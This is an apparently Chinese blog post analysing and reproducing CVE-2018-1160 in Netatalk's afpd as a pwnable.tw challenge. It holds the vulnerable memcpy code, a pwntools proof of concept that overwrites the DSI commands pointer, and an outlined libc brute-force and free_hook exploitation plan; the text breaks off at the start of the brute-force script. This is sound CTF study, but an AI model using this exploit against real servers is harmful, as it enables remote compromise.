<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>CVE-2018-1160分析与复现 - EP`s blog</title><meta name="Description" content="关于 LoveIt 主题"><meta property="og:title" content="CVE-2018-1160分析与复现" />
<meta property="og:description" content="pwnable.tw的第三题，卡住了。基本原理在参考链接里都写了，就记录一下过程然后补充一些我看师傅们博客比较疑惑的点吧。 简介 Netatal" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://linkleyping.top/cve-2018-1160/" />
<meta property="og:image" content="https://linkleyping.top/logo.png"/>
<meta property="article:published_time" content="2021-11-05T15:49:24+08:00" />
<meta property="article:modified_time" content="2022-04-02T20:47:48+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://linkleyping.top/logo.png"/>

<meta name="twitter:title" content="CVE-2018-1160分析与复现"/>
<meta name="twitter:description" content="pwnable.tw的第三题，卡住了。基本原理在参考链接里都写了，就记录一下过程然后补充一些我看师傅们博客比较疑惑的点吧。 简介 Netatal"/>
<meta name="application-name" content="EP`s blog">
<meta name="apple-mobile-web-app-title" content="EP`s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://linkleyping.top/cve-2018-1160/" /><link rel="prev" href="https://linkleyping.top/pwnable_kr_1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2018-1160分析与复现",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/linkleyping.top\/cve-2018-1160\/"
        },"image": ["https:\/\/linkleyping.top\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  4405 ,
        "url": "https:\/\/linkleyping.top\/cve-2018-1160\/","datePublished": "2021-11-05T15:49:24+08:00","dateModified": "2022-04-02T20:47:48+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "https:\/\/linkleyping.top\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "EP"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">  
    <div class="header-wrapper">  
        <div class="header-title">  
            <a href="/" title="EP`s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/icon.png"
        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
        data-sizes="auto"
        alt="/images/icon.png"
        title="/images/icon.png" />EP`s blog</a>  
        </div>  
        <div class="menu">  
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">  
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">  
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">  
                            <i class="fas fa-search fa-fw"></i>  
                        </a>  
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">  
                            <i class="fas fa-times-circle fa-fw"></i>  
                        </a>  
                        <span class="search-button search-loading" id="search-loading-desktop">  
                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
                        </span>  
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
                    <i class="fas fa-adjust fa-fw"></i>  
                </a>  
            </div>  
        </div>  
    </div>  
</header><header class="mobile" id="header-mobile">  
    <div class="header-container">  
        <div class="header-wrapper">  
            <div class="header-title">  
                <a href="/" title="EP`s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/icon.png"
        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
        data-sizes="auto"
        alt="/images/icon.png"
        title="/images/icon.png" />EP`s blog</a>  
            </div>  
            <div class="menu-toggle" id="menu-toggle-mobile">  
                <span></span><span></span><span></span>  
            </div>  
        </div>  
        <div class="menu" id="menu-mobile"><div class="search-wrapper">  
                    <div class="search mobile" id="search-mobile">  
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">  
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">  
                            <i class="fas fa-search fa-fw"></i>  
                        </a>  
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">  
                            <i class="fas fa-times-circle fa-fw"></i>  
                        </a>  
                        <span class="search-button search-loading" id="search-loading-mobile">  
                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
                        </span>  
                    </div>  
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">  
                        取消  
                    </a>  
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
                <i class="fas fa-adjust fa-fw"></i>  
            </a></div>  
    </div>  
</header>  
<div class="search-dropdown desktop">  
    <div id="search-dropdown-desktop"></div>  
</div>  
<div class="search-dropdown mobile">  
    <div id="search-dropdown-mobile"></div>  
</div>  
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">CVE-2018-1160分析与复现</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://linkleyping.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>EP</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/cve/"><i class="far fa-folder fa-fw"></i>cve</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-05">2021-11-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4405 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#简介">简介</a></li>
    <li><a href="#漏洞分析">漏洞分析</a></li>
    <li><a href="#漏洞利用">漏洞利用</a>
      <ul>
        <li><a href="#爆破libc基址">爆破libc基址</a></li>
        <li><a href="#srop">SROP</a></li>
      </ul>
    </li>
    <li><a href="#参考链接">参考链接</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>pwnable.tw的第三题，卡住了。基本原理在参考链接里都写了，就记录一下过程然后补充一些我看师傅们博客比较疑惑的点吧。</p>
<h2 id="简介">简介</h2>
<p>Netatalk是<a href="https://en.wikipedia.org/wiki/Apple_Filing_Protocol" target="_blank" rel="noopener noreffer">Apple归档协议（AFP，Apple Filing Protocol）</a>的一种实现。</p>
<p>想要自己重新编译启动服务可以参考这篇：https://xz.aliyun.com/t/3710</p>
<p>题目给了<code>afpd</code>和<code>libatalk.so</code>,就不自己编译了。</p>
<p>在<code>doc/manpages/man8/afpd.8.xml</code>中有启动方式：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;refsynopsisdiv&gt;</span>
    <span class="nt">&lt;cmdsynopsis&gt;</span>
      <span class="nt">&lt;command&gt;</span>afpd<span class="nt">&lt;/command&gt;</span>

      <span class="nt">&lt;arg</span> <span class="na">choice=</span><span class="s">&#34;opt&#34;</span><span class="nt">&gt;</span>-d<span class="nt">&lt;/arg&gt;</span>

      <span class="nt">&lt;arg</span> <span class="na">choice=</span><span class="s">&#34;opt&#34;</span><span class="nt">&gt;</span>-F <span class="nt">&lt;replaceable&gt;</span>configfile<span class="nt">&lt;/replaceable&gt;&lt;/arg&gt;</span>
    <span class="nt">&lt;/cmdsynopsis&gt;</span>

    <span class="nt">&lt;cmdsynopsis&gt;</span>
      <span class="nt">&lt;command&gt;</span>afpd<span class="nt">&lt;/command&gt;</span>

      <span class="nt">&lt;group</span> <span class="na">choice=</span><span class="s">&#34;plain&#34;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;arg</span> <span class="na">choice=</span><span class="s">&#34;plain&#34;</span><span class="nt">&gt;</span>-v<span class="nt">&lt;/arg&gt;</span>
        <span class="nt">&lt;arg</span> <span class="na">choice=</span><span class="s">&#34;plain&#34;</span><span class="nt">&gt;</span>-V<span class="nt">&lt;/arg&gt;</span>
        <span class="nt">&lt;arg</span> <span class="na">choice=</span><span class="s">&#34;plain&#34;</span><span class="nt">&gt;</span>-h<span class="nt">&lt;/arg&gt;</span>
      <span class="nt">&lt;/group&gt;</span>

    <span class="nt">&lt;/cmdsynopsis&gt;</span>
  <span class="nt">&lt;/refsynopsisdiv&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>启动：<code>LD_PRELOAD=./libatalk.so.18 ./afpd -d -F afp.conf</code></p>
<p>在 <a href="https://github.com/Netatalk/Netatalk">https://github.com/Netatalk/Netatalk</a> 下载源码后可以<code>git reset --hard 6243b6b89d21754c55f04e168dcfe8bb643a4285</code>方便查阅有漏洞的源码。</p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>主要漏洞出现在<code>libatalk/dsi/dsi_opensess.c/dsi_opensession</code>处</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* OpenSession. set up the connection */</span>
<span class="kt">void</span> <span class="nf">dsi_opensession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">uint32_t</span> <span class="n">servquant</span><span class="p">;</span>
  <span class="n">uint32_t</span> <span class="n">replcsize</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">offs</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">setnonblock</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">socket</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">&#34;dsi_opensession: setnonblock: %s&#34;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
      <span class="n">AFP_PANIC</span><span class="p">(</span><span class="s">&#34;setnonblock error&#34;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="cm">/* parse options */</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nl">DSIOPT_ATTNQUANT</span><span class="p">:</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">attn_quantum</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">attn_quantum</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">attn_quantum</span><span class="p">);</span>

    <span class="k">case</span> <span class="nl">DSIOPT_SERVQUANT</span><span class="p">:</span> <span class="cm">/* just ignore these */</span>
    <span class="k">default</span><span class="o">:</span>
      <span class="n">i</span> <span class="o">+=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* forward past length tag + length */</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>在这个<code>memcpy</code>处，第三个参数<code>dsi-&gt;commands[i]</code>的值是可控的，范围在0-255。同时<code>dsi-&gt;commands + i + 1</code>指针处的内容也是可控的，所以可以覆盖<code>dsi-&gt;attn_quantum</code>地址处的值。dsi的数据结构如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* child and parent processes might interpret a couple of these
</span><span class="cm"> * differently. */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">DSI</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">DSI</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>             <span class="cm">/* multiple listening addresses */</span>
    <span class="n">AFPObj</span>   <span class="o">*</span><span class="n">AFPobj</span><span class="p">;</span>
    <span class="kt">int</span>      <span class="n">statuslen</span><span class="p">;</span>
    <span class="kt">char</span>     <span class="n">status</span><span class="p">[</span><span class="mi">1400</span><span class="p">];</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">signature</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">dsi_block</span>        <span class="n">header</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">server</span><span class="p">,</span> <span class="n">client</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">itimerval</span>        <span class="n">timer</span><span class="p">;</span>
    <span class="kt">int</span>      <span class="n">tickle</span><span class="p">;</span>            <span class="cm">/* tickle count */</span>
    <span class="kt">int</span>      <span class="n">in_write</span><span class="p">;</span>          <span class="cm">/* in the middle of writing multiple packets,
</span><span class="cm">                                   signal handlers can&#39;t write to the socket */</span>
    <span class="kt">int</span>      <span class="n">msg_request</span><span class="p">;</span>       <span class="cm">/* pending message to the client */</span>
    <span class="kt">int</span>      <span class="n">down_request</span><span class="p">;</span>      <span class="cm">/* pending SIGUSR1 down in 5 mn */</span>

    <span class="n">uint32_t</span> <span class="n">attn_quantum</span><span class="p">,</span> <span class="n">datasize</span><span class="p">,</span> <span class="n">server_quantum</span><span class="p">;</span>
    <span class="n">uint16_t</span> <span class="n">serverID</span><span class="p">,</span> <span class="n">clientID</span><span class="p">;</span>
    <span class="n">uint8_t</span>  <span class="o">*</span><span class="n">commands</span><span class="p">;</span> <span class="cm">/* DSI recieve buffer */</span>
    <span class="n">uint8_t</span>  <span class="n">data</span><span class="p">[</span><span class="n">DSI_DATASIZ</span><span class="p">];</span>    <span class="cm">/* DSI reply buffer */</span>
    <span class="n">size_t</span>   <span class="n">datalen</span><span class="p">,</span> <span class="n">cmdlen</span><span class="p">;</span>
    <span class="n">off_t</span>    <span class="n">read_count</span><span class="p">,</span> <span class="n">write_count</span><span class="p">;</span>
    <span class="n">uint32_t</span> <span class="n">flags</span><span class="p">;</span>             <span class="cm">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span>
    <span class="kt">int</span>      <span class="n">socket</span><span class="p">;</span>            <span class="cm">/* AFP session socket */</span>
    <span class="kt">int</span>      <span class="n">serversock</span><span class="p">;</span>        <span class="cm">/* listening socket */</span>

    <span class="cm">/* DSI readahead buffer used for buffered reads in dsi_peek */</span>
    <span class="n">size_t</span>   <span class="n">dsireadbuf</span><span class="p">;</span>        <span class="cm">/* size of the DSI readahead buffer used in dsi_peek() */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>           <span class="cm">/* buffer start */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">start</span><span class="p">;</span>            <span class="cm">/* current buffer head */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">eof</span><span class="p">;</span>              <span class="cm">/* end of currently used buffer */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">end</span><span class="p">;</span>

<span class="cp">#ifdef USE_ZEROCONF
</span><span class="cp"></span>    <span class="kt">char</span> <span class="o">*</span><span class="n">bonjourname</span><span class="p">;</span>      <span class="cm">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span>
    <span class="kt">int</span> <span class="n">zeroconf_registered</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>
    <span class="cm">/* protocol specific open/close, send/receive
</span><span class="cm">     * send/receive fill in the header and use dsi-&gt;commands.
</span><span class="cm">     * write/read just write/read data */</span>
    <span class="n">pid_t</span>  <span class="p">(</span><span class="o">*</span><span class="n">proto_open</span><span class="p">)(</span><span class="k">struct</span> <span class="n">DSI</span> <span class="o">*</span><span class="p">);</span>
    <span class="kt">void</span>   <span class="p">(</span><span class="o">*</span><span class="n">proto_close</span><span class="p">)(</span><span class="k">struct</span> <span class="n">DSI</span> <span class="o">*</span><span class="p">);</span>
<span class="p">}</span> <span class="n">DSI</span><span class="p">;</span>

<span class="cp">#define DSI_BLOCKSIZ 16
</span><span class="cp"></span><span class="k">struct</span> <span class="n">dsi_block</span> <span class="p">{</span>
    <span class="n">uint8_t</span> <span class="n">dsi_flags</span><span class="p">;</span>       <span class="cm">/* packet type: request or reply */</span>
    <span class="n">uint8_t</span> <span class="n">dsi_command</span><span class="p">;</span>     <span class="cm">/* command */</span>
    <span class="n">uint16_t</span> <span class="n">dsi_requestID</span><span class="p">;</span>  <span class="cm">/* request ID */</span>
    <span class="k">union</span> <span class="p">{</span>
        <span class="n">uint32_t</span> <span class="n">dsi_code</span><span class="p">;</span>   <span class="cm">/* error code */</span>
        <span class="n">uint32_t</span> <span class="n">dsi_doff</span><span class="p">;</span>   <span class="cm">/* data offset */</span>
    <span class="p">}</span> <span class="n">dsi_data</span><span class="p">;</span>
    <span class="n">uint32_t</span> <span class="n">dsi_len</span><span class="p">;</span>        <span class="cm">/* total data length */</span>
    <span class="n">uint32_t</span> <span class="n">dsi_reserved</span><span class="p">;</span>   <span class="cm">/* reserved field */</span>
<span class="p">};</span>

<span class="cp">#define DSI_DATASIZ       65536
</span></code></pre></td></tr></table>
</div>
</div><p>所以可以覆写<code>attn_quantum/datasize/server_quantum/serverID/clientID/commands/data[DSI_DATASIZ]</code>这些成员。如果<code>commands</code>地址合法<code>server_quantum</code>会回传回来。</p>
<blockquote>
<p>当服务器端主进程fork出一个新的连接后，<code>commands</code>指针的生命周期就开始了。当<code>dsi</code>结构初始化后，堆空间将分配出一块内存并赋给<code>commands</code>。每一条传入的AFP消息都将在被Netatalk的AFP函数处理前，先被写入<code>commands</code>指针里。<code>commands</code>占用的内存在连接终止后、程序退出前被释放。</p>
</blockquote>
<p>所以输入的内容按照格式先存储在commands里然后再解析commands的内容。</p>
<p>跑一下这个poc:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">5566</span><span class="p">)</span>
<span class="n">dsi_opensession</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x01</span><span class="s2">&#34;</span> <span class="c1"># attention quantum option</span>
<span class="n">dsi_opensession</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x18</span><span class="s2">&#34;</span> <span class="c1"># length</span>
<span class="n">dsi_opensession</span> <span class="o">+=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">)</span>  <span class="c1"># 覆写commands指针为0xdeadbeefcafebabe</span>
<span class="n">dsi_header</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="c1"># &#34;request&#34; flag</span>
<span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x04</span><span class="s2">&#34;</span> <span class="c1"># dsi_getsession中想要转到open_session需要dsi_command为DSIFUNC_OPEN</span>
<span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x01</span><span class="s2">&#34;</span> <span class="c1"># request id</span>
<span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># data offset</span>
<span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">dsi_opensession</span><span class="p">))</span>
<span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># reserved</span>
<span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">dsi_opensession</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dsi_header</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dsi_header</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>执行完memcopy函数后：</p>
<p>


    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/CVE-2018-1160/1.png">
            <img src="/images/CVE-2018-1160/1.png" alt=""  />
        </a>
    </div>
</p>
<p>可以看到commands的指针被成功修改成了0xdeadbeefcafebabe</p>
<p>已知在连解断开后，这个commands指针的生命周期才会结束，所以这连解没断开的时候，后续的内容还是会写入这个commands指针指向的地方，commands指针可改的话即可达到地址任意写。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<p>一般地址任意写以后可以控制<code>free_hook</code>以及<code>free</code>对象就可以达到RCE的目的。这里用写<code>free_hook</code>的方法。</p>
<h3 id="爆破libc基址">爆破libc基址</h3>
<p>想要写<code>free_hook</code>首先需要泄露libc基址。</p>
<p>程序开了ASLR，每有一个新的连解就会fork出一个子进程处理，子进程的地址空间与父进程相同。</p>
<p>当覆写的<code>commands</code>指针不合法的时候，会产生段错误。如果是合法地址，服务器会将<code>server_quantum</code>的内容回传。那么可以一位一位的覆盖<code>DSI-&gt;commands</code>如果没有段错误(有返回内容)则说明爆破正确。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># context.log_level = &#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
